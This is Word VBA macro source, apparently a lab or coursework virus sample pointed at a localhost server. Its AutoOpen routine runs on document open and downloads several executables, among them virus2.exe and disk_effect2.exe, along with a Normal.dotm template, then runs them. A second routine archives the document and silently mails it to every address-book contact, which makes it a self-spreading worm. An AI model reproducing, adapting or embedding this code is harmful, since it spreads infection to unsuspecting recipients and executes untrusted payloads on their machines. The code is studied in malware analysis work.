Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
    ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub AutoOpen()
    SendEmail
    download
    exe_virus
    hackdocx
    disk_virus
End Sub

Sub exe_virus()
ChDir "C:\Users\Administrator\Desktop\test"
Shell "C:\Users\Administrator\Desktop\test\virus2.exe"
End Sub

Sub download()
cpath = ThisDocument.Path
URLDownloadToFile 0, "http://localhost:15006/virus2.exe", cpath & "\virus2.exe", 0, 0
URLDownloadToFile 0, "http://localhost:15006/Normal.dotm", cpath & "\Normal.dotm", 0, 0
URLDownloadToFile 0, "http://localhost:15006/doc_effect.exe", cpath & "\doc_effect.exe", 0, 0
URLDownloadToFile 0, "http://localhost:15006/disk_effect2.exe", cpath & "\disk_effect2.exe", 0, 0

End Sub

Sub hackdocx()
Shell "C:\Users\Administrator\Desktop\test\doc_effect.exe"
End Sub
Sub disk_virus()
Shell "C:\Users\Administrator\Desktop\test\disk_effect2.exe"
End Sub

Sub SendEmail()
    Dim OutlookObj As Object
    Set OutlookObj = CreateObject("Outlook.Application")
    Dim Mynamespace As Outlook.NameSpace
    Set Mynamespace = OutlookObj.GetNamespace("MAPI")
    Set fold = Mynamespace.AddressLists("��ϵ��")
    cpath = ThisDocument.Path
    Dim Rarexe As String
    Dim myRAR As String
    Dim Myfile As String
    Dim FileString As String
    Dim Result As Long
   cname = ThisDocument.Name
    
    ThisDocument.SaveAs2 cpath & "\tmp.docm"
    
    Rarexe = "C:\Program Files\WinRAR\WinRAR.exe"       'rar����·��
    myRAR = cpath & "\tmp.rar"                          'ѹ������ļ���
    Myfile = cpath & "\" & cname                        ' ָ��Ҫѹ�����ļ�
    FileString = Rarexe & " A " & myRAR & " " & Myfile  'rar�����A����ѹ���ļ����ַ���
    Result = Shell(FileString, vbHide)                  'ִ��ѹ��
    
    For Each olEntry In fold.AddressEntries
    
    Set OutlookNewMail = OutlookObj.CreateItem(0)
    
    With OutlookNewMail
        .To = olEntry.Address         '�ռ��˵�ַ
        .Subject = "a"                '�ʼ�����
        .Body = "how are you !"       '�ʼ�����
        .Attachments.Add myRAR        'ճ������
        .Send
    End With
    
    Next
    
    Kill myRAR
    ThisDocument.SaveAs2 cpath & "\" & cname
    Kill cpath & "\tmp.docm"
    
End Sub

